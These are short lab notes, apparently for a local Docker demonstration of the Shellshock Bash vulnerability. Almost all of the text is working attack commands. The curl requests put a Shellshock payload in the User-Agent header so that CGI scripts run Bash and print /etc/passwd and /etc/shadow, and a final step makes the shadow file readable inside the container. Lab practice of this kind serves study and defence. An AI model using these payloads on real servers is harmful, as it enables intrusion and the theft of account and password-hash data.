# Start web server
docker-compose up -d


# Launch the attack
View in a browser: http://127.0.0.1:8080/

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" http://your-ip:8080/cgi-bin/stats

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" http://127.0.0.1:8080/cgi-bin/stats


curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" http://127.0.0.1:8080/cgi-bin/demo.cgi


curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/shadow;'" http://127.0.0.1:8080/cgi-bin/stats
docker exec -it web-server bash
chmod +r /etc/shadow

